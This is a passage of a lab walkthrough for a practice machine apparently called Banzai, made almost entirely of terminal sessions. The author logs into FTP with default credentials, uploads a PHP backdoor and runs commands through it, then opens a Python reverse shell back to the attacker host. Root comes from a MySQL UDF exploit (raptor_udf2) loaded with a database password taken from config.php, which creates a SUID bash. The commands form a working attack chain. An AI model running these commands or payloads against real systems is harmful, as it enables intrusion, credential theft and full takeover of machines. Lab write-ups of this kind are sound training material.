host:<input type="text" name="host"value="localhost">  user: <input type="text" name="usr" value=root> password: <input type="text" name="passwd">

database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
</form>

<!--	http://michaeldaw.org	2006 	-->
```


FTP surprisingly works with `admin`:`admin` so we'll use that

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.51.56                                                                                                                                               1 ⚙
Connected to 192.168.51.56.
220 (vsFTPd 3.0.3)
Name (192.168.51.56:kali): admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
ftp> put php-backdoor.php
local: php-backdoor.php remote: php-backdoor.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2803 bytes sent in 0.00 secs (70.3460 MB/s)
ftp> del php-backdoor.php
250 Delete operation successful.
ftp> put php-backdoor.php
local: php-backdoor.php remote: php-backdoor.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2818 bytes sent in 0.00 secs (72.6339 MB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$   
```

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.51.56:8295/php-backdoor.php?c=ls+%2Fusr%2Fbin+%7C+grep+python                                                                               1 ⨯
<pre>dh_python2
dh_python3
python
python2
python2.7
python3
python3.5
python3.5m
python3m
```

## Reverse Shell

Used payload `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",8295));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`

![](Pasted%20image%2020220206100202.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 8295            
listening on [any] 8295 ...
connect to [192.168.49.51] from (UNKNOWN) [192.168.51.56] 53616
www-data@banzai:/var/www/html$ cd /home
cd /home
www-data@banzai:/home$ ls
ls
banzai
www-data@banzai:/home$ cd banzai
cd banzai
www-data@banzai:/home/banzai$ ls
ls
index.php  local.txt
www-data@banzai:/home/banzai$ cat local.txt
cat local.txt
97c3a279700a0bfb69546bf067ff1681
www-data@banzai:/home/banzai$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.51.56  netmask 255.255.255.0  broadcast 192.168.51.255
        ether 00:50:56:bf:cf:0d  txqueuelen 1000  (Ethernet)
        RX packets 2144  bytes 196285 (191.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1673  bytes 3042897 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 154  bytes 59673 (58.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 154  bytes 59673 (58.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@banzai:/home/banzai$ 
```

![](Pasted%20image%2020220206100253.png)

# Privesc

## To admin

SSH doesn't work
```
┌──(kali㉿kali)-[~]
└─$ ssh admin@192.168.51.56                    
admin@192.168.51.56's password: 
Permission denied, please try again.
admin@192.168.51.56's password: 
Permission denied, please try again.
admin@192.168.51.56's password: 
```


```
www-data@banzai:/tmp$ cd /var/www/html
cd /var/www/html
www-data@banzai:/var/www/html$ ls -al
ls -al
total 68
drwxr-xr-x  7 admin    root   4096 Feb  5 21:10 .
drwxr-xr-x  3 www-data root   4096 Jul 31  2020 ..
-rw-------  1 admin    admin   135 Feb  5 21:10 .bash_history
drwxr-xr-x  2 admin    root   4096 May 26  2020 contactform
drwxr-xr-x  2 admin    root   4096 May 26  2020 css
drwxr-xr-x  3 admin    root   4096 May 26  2020 img
-rw-r--r--  1 admin    root  23364 May 27  2020 index.php
drwxr-xr-x  2 admin    root   4096 May 26  2020 js
drwxr-xr-x 11 admin    root   4096 May 26  2020 lib
-rw-r--r--  1 admin    admin  2818 Feb  5 20:58 php-backdoor.php
-rw-r--r--  1 admin    admin  7296 Feb  5 21:09 raptor_udf2.o
www-data@banzai:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
banzai:x:1000:1000:Banzai,,,:/home/banzai:/bin/bash
admin:x:1001:1001::/var/www/html/:
ftp:x:108:113:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:109:114:MySQL Server,,,:/var/lib/mysql:/bin/false
postfix:x:110:115::/var/spool/postfix:/bin/false
postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
www-data@banzai:/var/www/html$ su admin
su admin
Password: admin

$ bash -p
bash -p
admin@banzai:/var/www/html$ 
```

## SQL Raptor test

```
admin@banzai:/var/www/html$ ps aux | grep root
ps aux | grep root
root         1  0.0  0.3 138932  6824 ?        Ss   20:42   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    20:42   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    20:42   0:00 [ksoftirqd/0]
root         4  0.0  0.0      0     0 ?        S    20:42   0:00 [kworker/0:0]
root         5  0.0  0.0      0     0 ?        S<   20:42   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    20:42   0:00 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    20:42   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    20:42   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S<   20:42   0:00 [lru-add-drain]
root        11  0.0  0.0      0     0 ?        S    20:42   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    20:42   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    20:42   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   20:42   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    20:42   0:00 [khungtaskd]
root        16  0.0  0.0      0     0 ?        S    20:42   0:00 [oom_reaper]
root        17  0.0  0.0      0     0 ?        S<   20:42   0:00 [writeback]
root        18  0.0  0.0      0     0 ?        S    20:42   0:00 [kcompactd0]
root        19  0.0  0.0      0     0 ?        SN   20:42   0:00 [ksmd]
root        21  0.0  0.0      0     0 ?        SN   20:42   0:00 [khugepaged]
root        22  0.0  0.0      0     0 ?        S<   20:42   0:00 [crypto]
root        23  0.0  0.0      0     0 ?        S<   20:42   0:00 [kintegrityd]
root        24  0.0  0.0      0     0 ?        S<   20:42   0:00 [bioset]
root        25  0.0  0.0      0     0 ?        S<   20:42   0:00 [kblockd]
root        26  0.0  0.0      0     0 ?        S<   20:42   0:00 [devfreq_wq]
root        27  0.0  0.0      0     0 ?        S<   20:42   0:00 [watchdogd]
root        28  0.0  0.0      0     0 ?        S    20:42   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   20:42   0:00 [vmstat]
root        41  0.0  0.0      0     0 ?        S<   20:42   0:00 [kthrotld]
root        42  0.0  0.0      0     0 ?        S<   20:42   0:00 [ipv6_addrconf]
root        68  0.0  0.0      0     0 ?        S<   20:42   0:00 [ata_sff]
root        77  0.0  0.0      0     0 ?        S    20:42   0:00 [scsi_eh_0]
root        78  0.0  0.0      0     0 ?        S<   20:42   0:00 [scsi_tmf_0]
root        79  0.0  0.0      0     0 ?        S    20:42   0:00 [scsi_eh_1]
root        80  0.0  0.0      0     0 ?        S<   20:42   0:00 [scsi_tmf_1]
root        81  0.0  0.0      0     0 ?        S    20:42   0:00 [kworker/u2:1]
root        83  0.0  0.0      0     0 ?        S    20:42   0:00 [scsi_eh_2]
root        84  0.0  0.0      0     0 ?        S<   20:42   0:00 [scsi_tmf_2]
root        85  0.0  0.0      0     0 ?        S<   20:42   0:00 [vmw_pvscsi_wq_2]
root        89  0.0  0.0      0     0 ?        S<   20:42   0:00 [bioset]
root       178  0.0  0.0      0     0 ?        S<   20:42   0:00 [bioset]
root       180  0.0  0.0      0     0 ?        S<   20:42   0:00 [kworker/0:1H]
root       205  0.0  0.0      0     0 ?        S<   20:42   0:00 [kworker/u3:0]
root       214  0.0  0.0      0     0 ?        S    20:42   0:00 [jbd2/sda1-8]
root       215  0.0  0.0      0     0 ?        S<   20:42   0:00 [ext4-rsv-conver]
root       248  0.0  0.2  51236  5228 ?        Ss   20:42   0:00 /lib/systemd/systemd-journald
root       252  0.0  0.5 214064 11760 ?        Ssl  20:42   0:00 /usr/bin/vmtoolsd
root       253  0.0  0.0      0     0 ?        S    20:42   0:00 [kauditd]
root       265  0.0  0.2  46920  5032 ?        Ss   20:42   0:00 /lib/systemd/systemd-udevd
root       345  0.0  0.0      0     0 ?        S<   20:42   0:00 [ttm_swap]
root       481  0.0  0.8 153504 18348 ?        Ss   20:42   0:00 /usr/bin/VGAuthService
root       482  0.0  0.1 250112  3064 ?        Ssl  20:42   0:00 /usr/sbin/rsyslogd -n
root       483  0.0  0.2  46532  4784 ?        Ss   20:42   0:00 /lib/systemd/systemd-logind
root       496  0.0  0.1  29664  2900 ?        Ss   20:42   0:00 /usr/sbin/cron -f
root       552  0.0  0.1  28448  2736 ?        Ss   20:42   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       559  0.0  0.0  14524  1864 tty1     Ss+  20:42   0:00 /sbin/agetty --noclear tty1 linux
root       696  0.0  0.2  69956  5384 ?        Ss   20:42   0:00 /usr/sbin/sshd -D
root       707  0.0  1.2 269384 25748 ?        Ss   20:42   0:00 /usr/sbin/apache2 -k start
root       735  0.0  8.5 1122984 175744 ?      Sl   20:42   0:00 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
root       918  0.0  0.2  81188  4448 ?        Ss   20:42   0:00 /usr/lib/postfix/sbin/master -w
root      1587  0.0  0.0      0     0 ?        S    21:04   0:00 [kworker/0:2]
root      1656  0.0  0.0      0     0 ?        S    21:08   0:00 [kworker/u2:2]
root      1667  0.0  0.0      0     0 ?        S    21:10   0:00 [kworker/0:1]
root      1677  0.0  0.0      0     0 ?        S    21:10   0:00 [kworker/0:3]
root      1681  0.0  0.0      0     0 ?        S    21:10   0:00 [kworker/0:4]
root      1685  0.0  0.1  49204  2944 pts/0    S    21:11   0:00 su admin
admin     1717  0.0  0.0  12780  1016 pts/0    S+   21:15   0:00 grep root
admin@banzai:/var/www/html$ 
```

```
┌──(kali㉿kali)-[/tmp]
└─$ echo "                                                                                                                                                          1 ⚙
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/html/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /var/www/html/suidbash && chmod u+s /var/www/html/suidbash');
exit
" > sql_payload
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c                                                                                   1 ⚙
--2022-02-05 21:12:28--  https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3314 (3.2K) [text/plain]
Saving to: ‘raptor_udf2.c’

raptor_udf2.c                             100%[=====================================================================================>]   3.24K  --.-KB/s    in 0s      

2022-02-05 21:12:28 (39.6 MB/s) - ‘raptor_udf2.c’ saved [3314/3314]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 8295                                                                                                                                     1 ⚙
Serving HTTP on 0.0.0.0 port 8295 (http://0.0.0.0:8295/) ...
192.168.51.56 - - [05/Feb/2022 21:12:40] "GET /sql_payload HTTP/1.1" 200 -
192.168.51.56 - - [05/Feb/2022 21:12:46] "GET /raptor_udf2.c HTTP/1.1" 200 -
```

```
admin@banzai:/var/www/html$ wget 192.168.49.51:8295/sql_payload
wget 192.168.49.51:8295/sql_payload
--2022-02-05 21:12:40--  http://192.168.49.51:8295/sql_payload
Connecting to 192.168.49.51:8295... connected.
HTTP request sent, awaiting response... 200 OK
Length: 333 [application/octet-stream]
Saving to: ‘sql_payload’

sql_payload         100%[===================>]     333  --.-KB/s    in 0s      

2022-02-05 21:12:40 (75.5 MB/s) - ‘sql_payload’ saved [333/333]

admin@banzai:/var/www/html$ wget 192.168.49.51:8295/raptor_udf2.c
wget 192.168.49.51:8295/raptor_udf2.c
--2022-02-05 21:12:45--  http://192.168.49.51:8295/raptor_udf2.c
Connecting to 192.168.49.51:8295... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3314 (3.2K) [text/x-csrc]
Saving to: ‘raptor_udf2.c’

raptor_udf2.c       100%[===================>]   3.24K  --.-KB/s    in 0s      

2022-02-05 21:12:46 (9.79 MB/s) - ‘raptor_udf2.c’ saved [3314/3314]

admin@banzai:/var/www/html$ gcc -g -c raptor_udf2.c
gcc -g -c raptor_udf2.c
admin@banzai:/var/www/html$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
<,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
gcc: error: unrecognized command line option ‘-W1,-soname,raptor_udf2.so’
admin@banzai:/var/www/html$ uname -a
uname -a
Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
admin@banzai:/var/www/html$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
<,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
admin@banzai:/var/www/html$ cat sql_payload | mysql -u root
cat sql_payload | mysql -u root
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
admin@banzai:/var/www/html$ mysql -u root
mysql -u root
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
admin@banzai:/var/www/html$ mysql -u root -proot 
mysql -u root -proot
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
admin@banzai:/var/www/html$ ls -al
ls -al
total 88
drwxr-xr-x  7 admin    root   4096 Feb  5 21:13 .
drwxr-xr-x  3 www-data root   4096 Jul 31  2020 ..
-rw-------  1 admin    admin   135 Feb  5 21:10 .bash_history
drwxr-xr-x  2 admin    root   4096 May 26  2020 contactform
drwxr-xr-x  2 admin    root   4096 May 26  2020 css
drwxr-xr-x  3 admin    root   4096 May 26  2020 img
-rw-r--r--  1 admin    root  23364 May 27  2020 index.php
drwxr-xr-x  2 admin    root   4096 May 26  2020 js
drwxr-xr-x 11 admin    root   4096 May 26  2020 lib
-rw-r--r--  1 admin    admin  2818 Feb  5 20:58 php-backdoor.php
-rw-r--r--  1 admin    admin  3314 Feb  5 21:12 raptor_udf2.c
-rw-r--r--  1 admin    admin  7296 Feb  5 21:12 raptor_udf2.o
-rwxr-xr-x  1 admin    admin 11200 Feb  5 21:13 raptor_udf2.so
-rw-r--r--  1 admin    admin   333 Feb  5 21:12 sql_payload
admin@banzai:/var/www/html$ 
```

## Admin SSH keys test

```
admin@banzai:/var/www/html$ mkdir .ssh
mkdir .ssh
admin@banzai:/var/www/html$ cat "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > .ssh/authorized_keys
<HGLoEjaNnOsPW7hM= kali@kali" > .ssh/authorized_keys
cat: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali': No such file or directory
admin@banzai:/var/www/html$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali" > .ssh/authorized_keys
<HGLoEjaNnOsPW7hM= kali@kali" > .ssh/authorized_keys
admin@banzai:/var/www/html$ 
```

```
┌──(kali㉿kali)-[~]
└─$ cat .ssh/id_rsa.pub                                                                                                                                           130 ⨯
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh -i ~/.ssh/id_rsa admin@192.168.51.56
admin@192.168.51.56's password: 

```

## SQL Using credentials

```
admin@banzai:/var/www$ cat config.php
cat config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
admin@banzai:/var/www$ cd html
cd html
admin@banzai:/var/www/html$ cat sql_payload | mysql -u root -pEscalateRaftHubris123
<sql_payload | mysql -u root -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1126 (HY000) at line 6: Can't open shared library 'raptor_udf2.so' (errno: 2 /usr/lib/mysql/plugin/raptor_udf2.so: cannot open shared object file: No such file or directory)
admin@banzai:/var/www/html$ 
admin@banzai:/var/www/html$ echo "                               
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/html/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /var/www/html/suidbash && chmod u+s /var/www/html/suidbash');
exit
" > sql_payloadecho "
> use mysql;
> create table foo(line blob);
> insert into foo values(load_file('/var/www/html/raptor_udf2.so'));
> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
> create function do_system returns integer soname 'raptor_udf2.so';
<tml/suidbash && chmod u+s /var/www/html/suidbash');
> exit
> 
" > sql_payload
admin@banzai:/var/www/html$ cat sql_payload | mysql -u root -pEscalateRaftHubris123

<sql_payload | mysql -u root -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1050 (42S01) at line 3: Table 'foo' already exists
admin@banzai:/var/www/html$ 
admin@banzai:/var/www/html$ ls
ls
contactform  img        js   php-backdoor.php  raptor_udf2.o   sql_payload
css          index.php  lib  raptor_udf2.c     raptor_udf2.so
admin@banzai:/var/www/html$ mysql -u root -pEscalateRaftHubris123
mysql -u root -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql
use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> drop table foo
drop table foo
    -> ;
;
Query OK, 0 rows affected (0.01 sec)

mysql> exit
exit
Bye
admin@banzai:/var/www/html$ cat sql_payload | mysql -u root -pEscalateRaftHubris123
<sql_payload | mysql -u root -pEscalateRaftHubris123

mysql: [Warning] Using a password on the command line interface can be insecure.
do_system('cp /bin/bash /var/www/html/suidbash && chmod u+s /var/www/html/suidbash')
0
admin@banzai:/var/www/html$ 
admin@banzai:/var/www/html$ ./suidbash -p
./suidbash -p
suidbash-4.4# cd /root
cd /root
suidbash-4.4# cat proof.txt
cat proof.txt
cafadd2aa436278cf46db04c2de598ef
suidbash-4.4# ifconfig
ifconfig
suidbash: ifconfig: command not found
suidbash-4.4# ls
ls
proof.txt
suidbash-4.4# cat proof.txt
cat proof.txt
cafadd2aa436278cf46db04c2de598ef
suidbash-4.4# /sbin/ifconfig
/sbin/ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.51.56  netmask 255.255.255.0  broadcast 192.168.51.255
        ether 00:50:56:bf:cf:0d  txqueuelen 1000  (Ethernet)
        RX packets 2583  bytes 420898 (411.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2030  bytes 3111160 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 265  bytes 97029 (94.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 265  bytes 97029 (94.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

suidbash-4.4# 

```